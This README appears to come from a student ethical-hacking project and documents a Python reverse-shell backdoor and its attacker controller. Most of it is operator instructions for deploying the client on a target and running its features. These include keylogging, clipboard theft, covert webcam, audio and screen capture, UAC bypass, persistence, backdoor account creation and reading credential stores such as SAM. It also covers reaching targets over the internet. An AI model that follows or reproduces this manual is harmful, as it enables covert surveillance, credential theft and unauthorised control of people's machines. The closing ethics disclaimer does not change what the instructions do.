# Team9 - Python Backdoor - DES484 Assignment

**⚠️ EDUCATIONAL PURPOSE ONLY - ETHICAL HACKING CLASS PROJECT**

This is a reverse shell backdoor created for the DES484 Ethical Hacking course at SIIT. This project demonstrates advanced post-exploitation techniques and backdoor development concepts.

## 📋 Project Structure

```
DES484_Backdoor/
├── backdoor.py                  # Backdoor client (deploys on target machine)
├── server.py                    # Attacker controller (runs on attacker machine)
├── requirements.txt             # Python dependencies (optional)
├── README.md                    # This file
│
├── docs/                        # Detailed implementation documentation
│   ├── FULL_IMPLEMENTATION_GUIDE.md      # Complete setup and usage guide
│   ├── KEYLOGGER_IMPLEMENTATION.md       # Keylogger feature guide
│   ├── CLIPBOARD_IMPLEMENTATION.md       # Clipboard stealer guide
│   ├── SCREEN_MEDIA_IMPLEMENTATION.md    # Screen/audio/webcam guide
│   ├── NETWORK_DISCOVERY_IMPLEMENTATION.md # Network recon guide
│   └── PRIVILEGE_ESCALATION_IMPLEMENTATION.md # Privilege escalation guide
│
├── features/                    # Feature modules
│   ├── __init__.py
│   ├── keylogger.py            # Keystroke logging with auto-download
│   ├── clipboard_stealer.py    # Clipboard monitoring and theft
│   ├── media_capture_tool.py   # Screen, audio, webcam, and screen recording
│   ├── network_discovery.py    # Network reconnaissance
│   └── privilege_escalation.py # Privilege escalation techniques
│
├── utils/                       # Utility modules
│   ├── __init__.py
│   └── check_environment.py    # Environment verification helpers
│
├── exploitation/                # Exploitation and payload building
│   ├── build_executable.py     # Build standalone executables
│   ├── EXECUTABLE_GUIDE.md     # Guide for creating executables
│   ├── SUMMARY.md              # Exploitation summary
│   ├── icons/                  # Icons for executables
│   │   └── README.md
│   └── payloads/               # Payload templates
│       └── README.md
│
└── logs/                       # Logs directory (auto-created)
    ├── keylog/                 # Keystroke logs
    │   └── README.md
    ├── clipboard/              # Clipboard logs
    │   └── README.md
    ├── screenshots/            # Captured screenshots
    │   └── README.md
    ├── audio/                  # Audio recordings
    │   └── README.md
    ├── webcam/                 # Webcam captures
    │   └── README.md
    └── recordings/             # Screen recordings
        └── README.md
```

### 📥 Downloaded Files (on Attacker Machine)

When using the backdoor, certain commands automatically download files to your attacker machine:

```
Attacker_Machine/
├── keylog_dump_YYYYMMDD_HHMMSS.txt  # Downloaded keylog files
├── server.py                         # Your controller
└── (downloaded screenshots, recordings, etc.)
```

## 🎯 Features Implemented

### 1. **Keylogger** ⌨️

- Real-time keystroke capture
- Logs keystrokes to file with timestamps
- **Auto-download feature**: `keylog_dump` automatically downloads log file to attacker machine
- Works with or without external libraries (fallback mode)
- Manual text logging for fallback mode
- Downloaded as: `keylog_dump_YYYYMMDD_HHMMSS.txt`
- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`, `keylog_status`, `keylog_manual`

### 2. **Privilege Escalation** 🔐

- Check current privilege level
- Enumerate Windows privilege escalation vectors
- Find sudo opportunities
- Discover writable system paths
- List running services
- Check scheduled tasks
- Find sensitive files (credentials, SSH keys, configs)
- Find weak file permissions
- Windows UAC bypass attempts
- DLL hijacking opportunities (Windows)
- Create persistence mechanisms
- Create backdoor user accounts
- Read admin-protected files with elevation attempts
- Read binary files with base64 encoding
- List admin-protected directory contents
- Comprehensive escalation scanning
- Commands: `priv_check`, `priv_enum`, `priv_scan`, `priv_services`, `priv_tasks`, `priv_sensitive`, `priv_weak_perms`, `priv_uac_bypass`, `priv_dll_hijack`, `priv_persist`, `priv_user`, `priv_read_file`, `priv_read_binary`, `priv_list_dir`

### 3. **Screen & Media Capture** 📸

- **Screenshot capture**: Single or multiple screenshots
- **Audio recording**: Record from microphone
  - Background recording: `audio_start`, `audio_stop`
  - Timed recording: `audio_record <duration>`
  - Status monitoring: `audio_status`
- **Webcam capture**: Capture images and video from webcam
  - Background recording: `webcam_start`, `webcam_stop`
  - Single image capture: `webcam_snap`
  - Status monitoring: `webcam_status`
- **Screen recording**: Record screen video with configurable FPS
  - Timed recording: `record_screen <duration> <fps>`
  - Background recording: `record_start`, `record_stop`
  - Multiple recording methods (OpenCV, MSS, ffmpeg)
- Multiple fallback methods for compatibility
- Commands: `screenshot`, `screenshot_multi`, `screenshot_list`, `audio_record`, `audio_start`, `audio_stop`, `audio_status`, `audio_list`, `webcam_snap`, `webcam_start`, `webcam_stop`, `webcam_status`, `webcam_list`, `record_screen`, `record_start`, `record_stop`, `record_status`, `record_list`

### 4. **Network Discovery** 🌐

- Network interface enumeration
- Local network scanning (ping sweep)
- Port scanning on remote hosts
- Active connection monitoring
- ARP cache inspection
- Public IP detection
- Internet connectivity check
- Commands: `net_info`, `net_scan`, `net_portscan`, `net_connections`, `net_public_ip`, `net_check_internet`

### 5. **Clipboard Stealer** 📋

- Real-time clipboard monitoring
- Captures all copied text automatically
- Logs clipboard content with timestamps
- Manual clipboard retrieval
- Remote clipboard manipulation
- Status monitoring
- **Auto-download feature**: `clipboard_dump` downloads log file to attacker
- Downloaded as: `clipboard_dump_YYYYMMDD_HHMMSS.txt`
- Commands: `clipboard_start`, `clipboard_stop`, `clipboard_status`, `clipboard_get`, `clipboard_set`, `clipboard_dump`, `clipboard_clear`, `clipboard_list`

### 6. **File Operations** 📁

- Download files from target to attacker
- Upload files from attacker to target
- Directory navigation
- Commands: `download <file>`, `upload <file>`, `cd <dir>`

## 🚀 Installation & Setup

### Prerequisites

- Python 3.6 or higher
- Network connectivity between attacker and target machines

### For Attacker Machine (Controller)

1. **Clone or download the project:**

   ```bash
   cd ~/Desktop
   git clone <repository> DES484_Backdoor
   cd DES484_Backdoor
   ```

2. **Install required libraries:**

   ```bash
   pip3 install -r requirements.txt
   ```

   This installs:

   - `pynput` - Keylogger functionality
   - `Pillow` - Screenshot capture
   - `pyautogui` - Screen automation
   - `pyaudio` - Audio recording
   - `opencv-python` - Webcam and screen recording
   - `numpy` - Screen recording support
   - `mss` - Fast screen capture
   - `imageio` - Video file creation
   - `imageio-ffmpeg` - FFmpeg codec support
   - `pyperclip` - Clipboard monitoring and manipulation

   **Note:** The controller script (`server.py`) uses only standard Python libraries. Install these dependencies for full feature support on target machines.

3. **Find your IP address:**

   ```bash
   # Linux/macOS
   ifconfig | grep "inet "
   # or
   ip addr show

   # Windows
   ipconfig
   ```

4. **Start the listener:**
   ```bash
   python3 server.py
   # Or specify custom port:
   python3 server.py 5555
   ```

### For Target Machine (Backdoor Client)

#### Method 1: Full Installation (Recommended for testing)

1. **Copy the entire project to target:**

   ```bash
   scp -r DES484_Backdoor user@target:/tmp/
   ```

   Or, download the project directly on the target machine using a web browser, HTTP file import, or Google Drive link, depending on the attacker's preferred method.

2. **Install required dependencies:**

   ```bash
   cd /tmp/DES484_Backdoor
   pip install -r requirements.txt
   ```

3. **Configure the backdoor:**
   Edit `backdoor.py` and change the connection settings:

   ```python
   ATTACKER_HOST = '192.168.1.12'  # Your attacker IP
   ATTACKER_PORT = 5558            # Your listener port
   ```

4. **Run the backdoor:**
   ```bash
   python3 backdoor.py
   ```

## 📖 Usage Guide

### Starting the Attack

1. **Start the controller on attacker machine:**

   ```bash
   python3 server.py
   ```

   Output:

   ```
   [+] Listening on 0.0.0.0:5558
   [*] Waiting for incoming connections...
   ```

2. **Deploy and run backdoor on target:**

   ```bash
   python3 backdoor.py
   ```

3. **Connection established:**
   ```
   [+] Connection established from 192.168.1.50:54321
   === System Information ===
   Hostname: target-machine
   System: Darwin
   ...
   ```

### Basic Commands

```bash
# Get help
help

# System information
sysinfo

# Execute shell commands
ls -la
whoami
cat /etc/passwd

# File operations
download /etc/passwd
upload malware.exe
cd /tmp

# Exit
quit
```

### Testing Features

#### Keylogger

```bash
# Start capturing keystrokes
keylog_start

# Download captured keystrokes (auto-downloads to attacker machine)
keylog_dump
# File saved as: keylog_dump_YYYYMMDD_HHMMSS.txt

# Check keylogger status
keylog_status

# Stop keylogger
keylog_stop

# Clear logs on target
keylog_clear
```

#### Privilege Escalation

```bash
# Check current privileges
priv_check

# Enumerate escalation vectors
priv_enum

# Comprehensive escalation scan (all techniques)
priv_scan

# List services (potential vulnerabilities)
priv_services

# Find scheduled tasks
priv_tasks

# Search for sensitive files
priv_sensitive

# Find weak file permissions
priv_weak_perms

# Windows UAC bypass (Windows only)
priv_uac_bypass

# Find DLL hijacking opportunities (Windows only)
priv_dll_hijack

# Create persistence mechanism
priv_persist

# Create persistence at specific path
priv_persist C:\Windows\Temp\backdoor.exe

# Create backdoor user (requires admin/root)
priv_user hacker SecurePass123

# Read admin-protected file
priv_read_file C:\Windows\System32\config\SAM

# Read binary file (returns base64)
priv_read_binary C:\Windows\System32\cmd.exe

# List admin-protected directory
priv_list_dir C:\Windows\System32\config
```

#### Screen Capture

```bash
# Take single screenshot
screenshot

# Take multiple screenshots (5 shots, 2 seconds apart)
screenshot_multi 5 2

# List captured screenshots
screenshot_list

# Download screenshot
download logs/screenshots/screenshot_20241002_143022.png
```

#### Screen Recording

```bash
# Record screen for 10 seconds at 15 fps (default)
record_screen

# Record for 30 seconds at 30 fps (high quality)
record_screen 30 30

# Start background recording (max 1 hour)
record_start

# Start background recording with custom max duration (600 seconds)
record_start 600

# Check recording status
record_status

# Stop background recording
record_stop

# List all recordings
record_list

# Download recording
download logs/recordings/screen_recording_20241004_143022.mp4
```

#### Audio & Webcam

```bash
# Record audio for 10 seconds
audio_record 10

# Start background audio recording
audio_start

# Check audio recording status
audio_status

# Stop background audio recording
audio_stop

# List recordings
audio_list

# Capture webcam image
webcam_snap

# Start background webcam recording
webcam_start

# Check webcam recording status
webcam_status

# Stop background webcam recording
webcam_stop

# List webcam captures
webcam_list

# Download recordings
download logs/audio/audio_20241002_143530.wav
download logs/webcam/webcam_20241002_143530.jpg
```

#### Network Discovery

```bash
# Get network information
net_info

# Scan local network for hosts
net_scan

# Show active connections
net_connections

# Scan ports on specific host
net_portscan 192.168.1.1

# Get public IP
net_public_ip

# Check internet connectivity
net_check_internet
```

#### Clipboard Stealer

```bash
# Start clipboard monitoring
clipboard_start

# Check clipboard monitoring status
clipboard_status

# Get current clipboard content
clipboard_get

# Set clipboard content
clipboard_set "Your text here"

# Download clipboard log (auto-downloads to attacker machine)
clipboard_dump
# File saved as: clipboard_dump_YYYYMMDD_HHMMSS.txt

# List clipboard logs
clipboard_list

# Clear clipboard log on target
clipboard_clear

# Stop clipboard monitoring
clipboard_stop
```

### All Commands

| Category        | Command                     | Description                             |
| --------------- | --------------------------- | --------------------------------------- |
| **Help**        | `help`                      | Show all available commands             |
| **System**      | `sysinfo`                   | Display system information              |
|                 | `cd <dir>`                  | Change directory                        |
| **Files**       | `download <file>`           | Download file from target               |
|                 | `upload <file>`             | Upload file to target                   |
| **Keylogger**   | `keylog_start`              | Start keystroke capture                 |
|                 | `keylog_stop`               | Stop keylogger                          |
|                 | `keylog_status`             | Show keylogger status                   |
|                 | `keylog_dump`               | Download keylog file                    |
|                 | `keylog_clear`              | Clear keylog file                       |
|                 | `keylog_manual <text>`      | Manually log text (fallback mode)       |
| **Screenshots** | `screenshot`                | Capture single screenshot               |
|                 | `screenshot_multi <n> <i>`  | Multiple screenshots (n shots, i sec)   |
|                 | `screenshot_list`           | List captured screenshots               |
| **Recording**   | `record_screen <sec> <fps>` | Record screen (duration, fps)           |
|                 | `record_start <max>`        | Start background screen recording       |
|                 | `record_stop`               | Stop background recording               |
|                 | `record_status`             | Show recording status                   |
|                 | `record_list`               | List all recordings                     |
| **Audio**       | `audio_record <sec>`        | Record audio for duration (default 10s) |
|                 | `audio_start`               | Start background audio recording        |
|                 | `audio_stop`                | Stop background audio recording         |
|                 | `audio_status`              | Check audio recording status            |
|                 | `audio_list`                | List audio recordings                   |
| **Webcam**      | `webcam_snap`               | Capture webcam image                    |
|                 | `webcam_start`              | Start background webcam recording       |
|                 | `webcam_stop`               | Stop background webcam recording        |
|                 | `webcam_status`             | Check webcam recording status           |
|                 | `webcam_list`               | List webcam captures                    |
| **Clipboard**   | `clipboard_start`           | Start clipboard monitoring              |
|                 | `clipboard_stop`            | Stop clipboard monitoring               |
|                 | `clipboard_status`          | Check clipboard monitor status          |
|                 | `clipboard_get`             | Get current clipboard content           |
|                 | `clipboard_set <text>`      | Set clipboard content                   |
|                 | `clipboard_dump`            | Download clipboard log                  |
|                 | `clipboard_clear`           | Clear clipboard log                     |
|                 | `clipboard_list`            | List clipboard logs                     |
| **Network**     | `net_info`                  | Network information                     |
|                 | `net_scan`                  | Scan local network                      |
|                 | `net_portscan <host>`       | Scan ports on remote host               |
|                 | `net_connections`           | Show active network connections         |
|                 | `net_public_ip`             | Get public IP address                   |
|                 | `net_check_internet`        | Check internet connectivity             |
| **Privileges**  | `priv_check`                | Check current privileges                |
|                 | `priv_enum`                 | Find escalation vectors                 |
|                 | `priv_scan`                 | Comprehensive escalation scan           |
|                 | `priv_services`             | List running services                   |
|                 | `priv_tasks`                | List scheduled tasks                    |
|                 | `priv_sensitive`            | Find sensitive files                    |
|                 | `priv_weak_perms`           | Find weak file permissions              |
|                 | `priv_uac_bypass`           | UAC bypass (Windows)                    |
|                 | `priv_dll_hijack`           | DLL hijacking (Windows)                 |
|                 | `priv_persist <path>`       | Create persistence mechanism            |
|                 | `priv_user <user> <pass>`   | Create backdoor user                    |
|                 | `priv_read_file <path>`     | Read admin-protected file               |
|                 | `priv_read_binary <path>`   | Read admin-protected binary (base64)    |
|                 | `priv_list_dir <path>`      | List admin-protected directory          |
| **Exit**        | `quit`                      | Close connection                        |

### File Locations

**On Target Machine:**

- Keylogs: `logs/keylog/keylog.txt`
- Clipboard logs: `logs/clipboard/clipboard.txt`
- Screenshots: `logs/screenshots/`
- Recordings: `logs/recordings/`
- Audio: `logs/audio/`
- Webcam: `logs/webcam/`

**On Attacker Machine (where `server.py` runs):**

- Downloaded keylogs: `keylog_dump_YYYYMMDD_HHMMSS.txt`
- Downloaded clipboard logs: `clipboard_dump_YYYYMMDD_HHMMSS.txt`
- Downloaded screenshots, recordings, audio, webcam captures:  
   Saved in the same directory as `server.py` by default.  
   If you use a path like `download logs/audio/filename.wav`, the file will be saved in `logs/audio/` on the attacker's side, matching the folder structure.

  This applies to other features as well:  
  For example, downloading screenshots with `download logs/screenshots/screenshot_xxx.png` will save the file in `logs/screenshots/` on the attacker's machine. The same applies for recordings, webcam captures, and clipboard logs—using the full path will preserve the folder structure when saving on the attacker's side.

- All other downloads:  
  Saved in the current working directory of the controller (`server.py`), using the same filename as on the target machine.  
  For example, downloading a file like `secret.txt` from the target will save it as `secret.txt` in your current directory on the attacker's side.

## 🔧 Troubleshooting

### Connection Issues

**Problem:** Target can't connect to attacker

```bash
# On attacker machine, check firewall:
sudo ufw allow 5558/tcp          # Linux
sudo firewall-cmd --add-port=5558/tcp  # CentOS/RHEL

# Verify listener is running:
netstat -an | grep 5558
```

**Problem:** Wrong IP address

```bash
# Find correct IP:
ip addr show                      # Linux
ifconfig                          # macOS
ipconfig                          # Windows
```

### Feature Not Working

**Problem:** "Feature not available"

```bash
# Check if feature modules exist:
ls features/

# Install dependencies:
pip install -r requirements.txt

# Or use fallback mode (features use system commands)
```

**Problem:** Import errors

```bash
# The backdoor is designed to work without external libraries
# Features automatically use fallback methods

# To use full features, install:
pip install pynput Pillow pyautogui pyaudio opencv-python numpy mss imageio imageio-ffmpeg

# For screen recording, also install ffmpeg (recommended):
# macOS:   brew install ffmpeg
# Ubuntu:  sudo apt-get install ffmpeg
# Windows: Download from ffmpeg.org
```

### Permission Issues

**Problem:** Permission denied

```bash
# Run with appropriate permissions:
sudo python3 backdoor.py          # For privileged operations

# Or use privilege escalation features:
priv_enum                         # Find escalation vectors
```

## 🌐 Network Configuration

### Same Network (LAN)

```python
# In backdoor.py:
ATTACKER_HOST = '192.168.0.107'   # Attacker's local IP
ATTACKER_PORT = 5558
```

### Different Networks (WAN/Internet)

**Method 1: Port Forwarding**

```bash
# On attacker's router:
# Forward external_port -> attacker_ip:5558

# In backdoor.py:
ATTACKER_HOST = 'attacker_public_ip'
ATTACKER_PORT = external_port
```

**Method 2: Reverse SSH Tunnel**

```bash
# On target:
ssh -R 5558:localhost:5558 user@attacker_public_ip

# In backdoor.py:
ATTACKER_HOST = 'localhost'
ATTACKER_PORT = 5558
```

**Method 3: VPN**

```bash
# Use VPN to create virtual LAN
# Both machines connect to same VPN
# Use VPN IP addresses
```

## 📚 Documentation

This project includes comprehensive documentation organized in the `docs/` folder:

### Main Documentation

- **README.md** (this file) - Quick start and overview
- **docs/FULL_IMPLEMENTATION_GUIDE.md** - Complete setup, testing, and feature guides

### Feature-Specific Implementation Guides

- **docs/KEYLOGGER_IMPLEMENTATION.md** - Keylogger commands, troubleshooting, and attack scenarios
- **docs/CLIPBOARD_IMPLEMENTATION.md** - Clipboard stealer implementation, injection attacks, and limitations
- **docs/SCREEN_MEDIA_IMPLEMENTATION.md** - Screenshots, audio, webcam, and screen recording guide
- **docs/NETWORK_DISCOVERY_IMPLEMENTATION.md** - Network reconnaissance and scanning techniques
- **docs/PRIVILEGE_ESCALATION_IMPLEMENTATION.md** - Privilege escalation enumeration and exploitation

### Exploitation Guides

- **exploitation/EXECUTABLE_GUIDE.md** - How to create standalone executables
- **exploitation/SUMMARY.md** - Exploitation techniques summary

### Quick Reference

Each implementation guide in `docs/` includes:

- 📖 **Implementation Details** - How the feature works
- 💻 **Commands Reference** - All available commands with examples
- 🔧 **Troubleshooting** - Common issues and solutions
- ⚠️ **Limitations** - Technical and functional limitations
- 🎯 **Attack Scenarios** - Real-world usage examples
- 🛡️ **Security Considerations** - For both attackers and defenders

All features are fully documented with practical examples and step-by-step instructions.

## ⚖️ Ethical Guidelines

**IMPORTANT:** This tool is for **AUTHORIZED TESTING ONLY**

### Legal Usage

✅ Your own systems
✅ Lab environments with permission
✅ Authorized penetration testing engagements
✅ Educational research with consent

### Illegal Usage

❌ Unauthorized access to systems
❌ Malicious purposes
❌ Violating privacy laws
❌ Without written authorization
